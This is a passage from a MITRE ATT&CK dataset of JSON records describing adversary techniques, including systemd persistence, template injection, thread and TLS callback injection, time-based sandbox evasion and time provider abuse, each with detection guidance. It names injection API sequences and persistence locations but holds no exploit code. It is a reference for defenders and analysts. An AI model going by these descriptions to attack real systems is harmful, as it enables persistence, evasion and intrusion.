Retrieved March 26, 2019.\",\"source_name\":\"Talos Nyetya June 2017\",\"url\":\"https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html\"},{\"description\":\"Mercer, W. and Rascagneres, P. (2018, February 12). Olympic Destroyer Takes Aim At Winter Olympics. Retrieved March 14, 2019.\",\"source_name\":\"Talos Olympic Destroyer 2018\",\"url\":\"https://blog.talosintelligence.com/2018/02/olympic-destroyer.html\"}],\"id\":\"attack-pattern--ff73aa03-0090-4464-83ac-f89e233c02bc\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2020-03-27T21:18:48.149Z\",\"name\":\"System Shutdown/Reboot\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Windows event logs\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_detection\":\"Use process monitoring to monitor the execution and command line parameters of binaries involved in shutting down or rebooting systems. Windows event logs may also designate activity associated with a shutdown/reboot, ex. Event ID 1074 and 6006.\",\"x_mitre_impact_type\":[\"Availability\"],\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"root\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:37.450Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. (Citation: MSDN System Time) (Citation: Technet Windows Time Service)\\n\\nSystem time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\\\\\\\hostname</code> to gather the system time on a remote system. The victim\'s time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>. (Citation: Technet Windows Time Service) The information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) (Citation: RSA EU12 They\'re Inside), or to discover locality information based on time zone to assist in victim targeting.\",\"external_references\":[{\"external_id\":\"T1124\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1124\"},{\"external_id\":\"CAPEC-295\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/295.html\"},{\"description\":\"Microsoft. (n.d.). System Time. Retrieved November 25, 2016.\",\"source_name\":\"MSDN System Time\",\"url\":\"https://msdn.microsoft.com/ms724961.aspx\"},{\"description\":\"Mathers, B. (2016, September 30). Windows Time Service Tools and Settings. Retrieved November 25, 2016.\",\"source_name\":\"Technet Windows Time Service\",\"url\":\"https://technet.microsoft.com/windows-server-docs/identity/ad-ds/get-started/windows-time-service/windows-time-service-tools-and-settings\"},{\"description\":\"Rivner, U., Schwartz, E. (2012). They’re Inside… Now What?. Retrieved November 25, 2016.\",\"source_name\":\"RSA EU12 They\'re Inside\",\"url\":\"https://www.rsaconference.com/writable/presentations/file_upload/ht-209_rivner_schwartz.pdf\"}],\"id\":\"attack-pattern--f3c544dc-673c-4ef3-accb-53229f1ae077\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-15T01:07:42.700Z\",\"name\":\"System Time Discovery\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"Process command-line parameters\",\"API monitoring\"],\"x_mitre_detection\":\"Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2019-04-23T15:34:30.008Z\",\"external_references\":[{\"external_id\":\"T1501\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1501\"},{\"description\":\"Linux man-pages. (2014, January). systemd(1) - Linux manual page. Retrieved April 23, 2019.\",\"source_name\":\"Linux man-pages: systemd January 2014\",\"url\":\"http://man7.org/linux/man-pages/man1/systemd.1.html\"},{\"description\":\"Freedesktop.org. (2018, September 29). systemd System and Service Manager. Retrieved April 23, 2019.\",\"source_name\":\"Freedesktop.org Linux systemd 29SEP2018\",\"url\":\"https://www.freedesktop.org/wiki/Software/systemd/\"},{\"description\":\"Anomali Labs. (2019, March 15). Rocke Evolves Its Arsenal With a New Malware Family Written in Golang. Retrieved April 24, 2019.\",\"source_name\":\"Anomali Rocke March 2019\",\"url\":\"https://www.anomali.com/blog/rocke-evolves-its-arsenal-with-a-new-malware-family-written-in-golang\"},{\"description\":\"Catalin Cimpanu. (2018, July 10). ~x file downloaded in public Arch package compromise. Retrieved April 23, 2019.\",\"source_name\":\"gist Arch package compromise 10JUL2018\",\"url\":\"https://gist.github.com/campuscodi/74d0d2e35d8fd9499c76333ce027345a\"},{\"description\":\"Catalin Cimpanu. (2018, July 10). Malware Found in Arch Linux AUR Package Repository. Retrieved April 23, 2019.\",\"source_name\":\"Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018\",\"url\":\"https://www.bleepingcomputer.com/news/security/malware-found-in-arch-linux-aur-package-repository/\"},{\"description\":\"Eli Schwartz. (2018, June 8). acroread package compromised. Retrieved April 23, 2019.\",\"source_name\":\"acroread package compromised Arch Linux Mail 8JUL2018\",\"url\":\"https://lists.archlinux.org/pipermail/aur-general/2018-July/034153.html\"},{\"description\":\"Rapid7. (2016, June 22). Service Persistence. Retrieved April 23, 2019.\",\"source_name\":\"Rapid7 Service Persistence 22JUNE2016\",\"url\":\"https://www.rapid7.com/db/modules/exploit/linux/local/service_persistence\"}],\"id\":\"attack-pattern--0fff2797-19cb-41ea-a5f1-8a9303b8158e\",\"modified\":\"2020-01-17T16:51:52.027Z\",\"name\":\"Systemd Service\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-17T16:15:19.870Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. The systemd service manager is commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014)(Citation: Freedesktop.org Linux systemd 29SEP2018) Systemd is the default initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems.\\n\\nSystemd utilizes configuration files known as service units to control how services boot and under what conditions. By default, these unit files are stored in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories and have the file extension <code>.service</code>. Each service unit file may contain numerous directives that can execute system commands:\\n\\n* ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by \'systemctl\' or on system start if the service is set to automatically start. \\n* ExecReload directive covers when a service restarts. \\n* ExecStop and ExecStopPost directives cover when a service is stopped or manually by \'systemctl\'.\\n\\nAdversaries have used systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files that cause systemd to execute malicious commands at recurring intervals, such as at system boot.(Citation: Anomali Rocke March 2019)(Citation: gist Arch package compromise 10JUL2018)(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018)\\n\\nWhile adversaries typically require root privileges to create/modify service unit files in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories, low privilege users can create/modify service unit files in directories such as <code>~/.config/systemd/user/</code> to achieve user-level persistence.(Citation: Rapid7 Service Persistence 22JUNE2016)\",\"external_references\":[{\"external_id\":\"T1543.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1543/002\"},{\"description\":\"Linux man-pages. (2014, January). systemd(1) - Linux manual page. Retrieved April 23, 2019.\",\"source_name\":\"Linux man-pages: systemd January 2014\",\"url\":\"http://man7.org/linux/man-pages/man1/systemd.1.html\"},{\"description\":\"Freedesktop.org. (2018, September 29). systemd System and Service Manager. Retrieved April 23, 2019.\",\"source_name\":\"Freedesktop.org Linux systemd 29SEP2018\",\"url\":\"https://www.freedesktop.org/wiki/Software/systemd/\"},{\"description\":\"Anomali Labs. (2019, March 15). Rocke Evolves Its Arsenal With a New Malware Family Written in Golang. Retrieved April 24, 2019.\",\"source_name\":\"Anomali Rocke March 2019\",\"url\":\"https://www.anomali.com/blog/rocke-evolves-its-arsenal-with-a-new-malware-family-written-in-golang\"},{\"description\":\"Catalin Cimpanu. (2018, July 10). ~x file downloaded in public Arch package compromise. Retrieved April 23, 2019.\",\"source_name\":\"gist Arch package compromise 10JUL2018\",\"url\":\"https://gist.github.com/campuscodi/74d0d2e35d8fd9499c76333ce027345a\"},{\"description\":\"Catalin Cimpanu. (2018, July 10). Malware Found in Arch Linux AUR Package Repository. Retrieved April 23, 2019.\",\"source_name\":\"Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018\",\"url\":\"https://www.bleepingcomputer.com/news/security/malware-found-in-arch-linux-aur-package-repository/\"},{\"description\":\"Eli Schwartz. (2018, June 8). acroread package compromised. Retrieved April 23, 2019.\",\"source_name\":\"acroread package compromised Arch Linux Mail 8JUL2018\",\"url\":\"https://lists.archlinux.org/pipermail/aur-general/2018-July/034153.html\"},{\"description\":\"Rapid7. (2016, June 22). Service Persistence. Retrieved April 23, 2019.\",\"source_name\":\"Rapid7 Service Persistence 22JUNE2016\",\"url\":\"https://www.rapid7.com/db/modules/exploit/linux/local/service_persistence\"}],\"id\":\"attack-pattern--dfefe2ed-4389-4318-8762-f0272b350a1b\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-25T22:13:59.473Z\",\"name\":\"Systemd Service\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Tony Lambert, Red Canary\"],\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"Systemd service unit files may be detected by auditing file creation and modification events within the <code>/etc/systemd/system</code>, <code>/usr/lib/systemd/system/</code>, and <code>/home/<username>/.config/systemd/user/</code> directories, as well as associated symbolic links. Suspicious processes or scripts spawned in this manner will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the ‘root’ user.\\n\\nSuspicious systemd services can also be identified by comparing results against a trusted system baseline. Malicious systemd services may be detected by using the systemctl utility to examine system wide services: <code>systemctl list-units -–type=service –all</code>. Analyze the contents of <code>.service</code> files present on the file system and ensure that they refer to legitimate, expected executables.\\n\\nAuditing the execution and command-line arguments of the \'systemctl\' utility, as well related utilities such as <code>/usr/sbin/service</code> may reveal malicious systemd service execution.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"root\"],\"x_mitre_platforms\":[\"Linux\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:01.759Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"\\nAdversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary\'s code on a remote system. Adversaries may use tainted shared content to move laterally.\\n\\nA directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009) of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real directories, which are hidden through [Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001). The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user\'s expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. (Citation: Retwin Directory Share Pivot)\\n\\nAdversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.\",\"external_references\":[{\"external_id\":\"T1080\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1080\"},{\"external_id\":\"CAPEC-562\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/562.html\"},{\"description\":\"Routin, D. (2017, November 13). Abusing network shares for efficient lateral movements and privesc (DirSharePivot). Retrieved April 12, 2018.\",\"source_name\":\"Retwin Directory Share Pivot\",\"url\":\"https://rewtin.blogspot.ch/2017/11/abusing-user-shares-for-efficient.html\"}],\"id\":\"attack-pattern--246fd3c7-f5e3-466d-8787-4c13d9e3b61c\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"lateral-movement\"}],\"modified\":\"2020-03-31T22:14:56.107Z\",\"name\":\"Taint Shared Content\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Michal Dida, ESET\",\"David Routin\"],\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\"],\"x_mitre_detection\":\"Processes that write or overwrite many files to a network shared directory may be suspicious. Monitor processes that are executed from removable media for malicious or abnormal activity such as network connections due to Command and Control and possible network Discovery techniques.\\n\\nFrequently scan shared network directories for malicious files, hidden files, .LNK files, and other file types that may not typical exist in directories used to share specific types of content.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_system_requirements\":[\"Access to shared folders and content with write permissions\"],\"x_mitre_version\":\"1.2\"}",
    "{\"created\":\"2018-10-17T00:14:20.652Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may create or modify references in Office document templates to conceal malicious code or force authentication attempts. Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered. (Citation: Microsoft Open XML July 2017)\\n\\nProperties within parts may reference shared public resources accessed via online URLs. For example, template properties reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.\\n\\nAdversaries may abuse this technology to initially conceal malicious code to be executed via documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. (Citation: SANS Brian Wiltse Template Injection) These documents can be delivered via other techniques such as [Phishing](https://attack.mitre.org/techniques/T1566) and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. (Citation: Redxorblue Remote Template Injection) Examples have been seen in the wild where template injection was used to load malicious code containing an exploit. (Citation: MalwareBytes Template Injection OCT 2017)\\n\\nThis technique may also enable [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt. (Citation: Anomali Template Injection MAR 2018) (Citation: Talos Template Injection July 2017) (Citation: ryhanson phishery SEPT 2016)\",\"external_references\":[{\"external_id\":\"T1221\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1221\"},{\"description\":\"Microsoft. (2014, July 9). Introducing the Office (2007) Open XML File Formats. Retrieved July 20, 2018.\",\"source_name\":\"Microsoft Open XML July 2017\",\"url\":\"https://docs.microsoft.com/previous-versions/office/developer/office-2007/aa338205(v=office.12)\"},{\"description\":\"Wiltse, B.. (2018, November 7). Template Injection Attacks - Bypassing Security Controls by Living off the Land. Retrieved April 10, 2019.\",\"source_name\":\"SANS Brian Wiltse Template Injection\",\"url\":\"https://www.sans.org/reading-room/whitepapers/testing/template-injection-attacks-bypassing-security-controls-living-land-38780\"},{\"description\":\"Hawkins, J. (2018, July 18). Executing Macros From a DOCX With Remote Template Injection. Retrieved October 12, 2018.\",\"source_name\":\"Redxorblue Remote Template Injection\",\"url\":\"http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html\"},{\"description\":\"Segura, J. (2017, October 13). Decoy Microsoft Word document delivers malware through a RAT. Retrieved July 21, 2018.\",\"source_name\":\"MalwareBytes Template Injection OCT 2017\",\"url\":\"https://blog.malwarebytes.com/threat-analysis/2017/10/decoy-microsoft-word-document-delivers-malware-through-rat/\"},{\"description\":\"Intel_Acquisition_Team. (2018, March 1). Credential Harvesting and Malicious File Delivery using Microsoft Office Template Injection. Retrieved July 20, 2018.\",\"source_name\":\"Anomali Template Injection MAR 2018\",\"url\":\"https://forum.anomali.com/t/credential-harvesting-and-malicious-file-delivery-using-microsoft-office-template-injection/2104\"},{\"description\":\"Baird, S. et al.. (2017, July 7). Attack on Critical Infrastructure Leverages Template Injection. Retrieved July 21, 2018.\",\"source_name\":\"Talos Template Injection July 2017\",\"url\":\"https://blog.talosintelligence.com/2017/07/template-injection.html\"},{\"description\":\"Hanson, R. (2016, September 24). phishery. Retrieved July 21, 2018.\",\"source_name\":\"ryhanson phishery SEPT 2016\",\"url\":\"https://github.com/ryhanson/phishery\"}],\"id\":\"attack-pattern--dc31fe1e-d722-49da-8f5f-92c7b5aff534\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-04-29T14:37:59.462Z\",\"name\":\"Template Injection\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Brian Wiltse @evalstrings\",\"Patrick Campbell, @pjcampbe11\"],\"x_mitre_data_sources\":[\"Anti-virus\",\"Email gateway\",\"Network intrusion detection system\",\"Web logs\"],\"x_mitre_defense_bypassed\":[\"Static File Analysis\"],\"x_mitre_detection\":\"Analyze process behavior to determine if an Office application is performing actions, such as opening network connections, reading files, spawning abnormal child processes (ex: [PowerShell](https://attack.mitre.org/techniques/T1059/001)), or other suspicious actions that could relate to post-compromise behavior.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.2\"}",
    "{\"created\":\"2020-01-14T01:28:32.166Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. \\n\\nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Endgame Process Injection July 2017)\\n\\nThis is very similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) but targets an existing process rather than creating a process in a suspended state.  \\n\\nRunning code in the context of another process may allow access to the process\'s memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process. \",\"external_references\":[{\"external_id\":\"T1055.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1055/003\"},{\"description\":\"Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.\",\"source_name\":\"Endgame Process Injection July 2017\",\"url\":\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\"}],\"id\":\"attack-pattern--41d9846c-f6af-4302-a654-24bba2729bc6\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-06-20T22:21:29.233Z\",\"name\":\"Thread Execution Hijacking\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"API monitoring\"],\"x_mitre_defense_bypassed\":[\"Application control\",\"Anti-virus\"],\"x_mitre_detection\":\"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Endgame Process Injection July 2017)\\n\\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-01-14T01:30:41.092Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. \\n\\nTLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code\'s legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other [Process Injection](https://attack.mitre.org/techniques/T1055) techniques such as [Process Hollowing](https://attack.mitre.org/techniques/T1055/012).(Citation: FireEye TLS Nov 2017)\\n\\nRunning code in the context of another process may allow access to the process\'s memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process. \",\"external_references\":[{\"external_id\":\"T1055.005\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1055/005\"},{\"description\":\"Vaish, A. & Nemes, S. (2017, November 28). Newly Observed Ursnif Variant Employs Malicious TLS Callback Technique to Achieve Process Injection. Retrieved December 18, 2017.\",\"source_name\":\"FireEye TLS Nov 2017\",\"url\":\"https://www.fireeye.com/blog/threat-research/2017/11/ursnif-variant-malicious-tls-callback-technique.html\"},{\"description\":\"Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.\",\"source_name\":\"Endgame Process Injection July 2017\",\"url\":\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\"}],\"id\":\"attack-pattern--e49ee9d2-0d98-44ef-85e5-5d3100065744\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-06-20T22:23:30.093Z\",\"name\":\"Thread Local Storage\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"API monitoring\"],\"x_mitre_defense_bypassed\":[\"Anti-virus\",\"Application control\"],\"x_mitre_detection\":\"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Endgame Process Injection July 2017)\\n\\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-06T21:11:11.225Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.\\n\\nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled [Multi-Stage Channels](https://attack.mitre.org/techniques/T1104) to avoid analysis and scrutiny. \",\"external_references\":[{\"external_id\":\"T1497.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1497/003\"}],\"id\":\"attack-pattern--4bed873f-0b7d-41d4-b93a-b6905d1f90b0\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-07-01T16:32:02.532Z\",\"name\":\"Time Based Evasion\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Deloitte Threat Library Team\"],\"x_mitre_data_sources\":[\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_defense_bypassed\":[\"Host forensic analysis\",\"Signature-based detection\",\"Static File Analysis\",\"Anti-virus\"],\"x_mitre_detection\":\"Time-based evasion will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary\'s implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. \",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"external_references\":[{\"external_id\":\"T1209\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1209\"},{\"description\":\"Microsoft. (2018, February 1). Windows Time Service (W32Time). Retrieved March 26, 2018.\",\"source_name\":\"Microsoft W32Time Feb 2018\",\"url\":\"https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-top\"},{\"description\":\"Microsoft. (n.d.). Time Provider. Retrieved March 26, 2018.\",\"source_name\":\"Microsoft TimeProvider\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/ms725475.aspx\"},{\"description\":\"Lundgren, S. (2017, October 28). w32time. Retrieved March 26, 2018.\",\"source_name\":\"Github W32Time Oct 2017\",\"url\":\"https://github.com/scottlundgren/w32time\"},{\"description\":\"Mathers, B. (2017, May 31). Windows Time Service Tools and Settings. Retrieved March 26, 2018.\",\"source_name\":\"Microsoft W32Time May 2017\",\"url\":\"https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-tools-and-settings\"},{\"description\":\"Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.\",\"source_name\":\"TechNet Autoruns\",\"url\":\"https://technet.microsoft.com/en-us/sysinternals/bb963902\"}],\"id\":\"attack-pattern--dce31a00-1e90-4655-b0f9-e2e71a748a87\",\"modified\":\"2020-01-24T16:48:50.715Z\",\"name\":\"Time Providers\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-24T15:51:52.317Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains. (Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients. (Citation: Microsoft TimeProvider)\\n\\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  <code>HKEY_LOCAL_MACHINE\\\\System\\\\CurrentControlSet\\\\Services\\\\W32Time\\\\TimeProviders\\\\</code>. (Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed. (Citation: Microsoft TimeProvider)\\n\\nAdversaries may abuse this architecture to establish persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account. (Citation: Github W32Time Oct 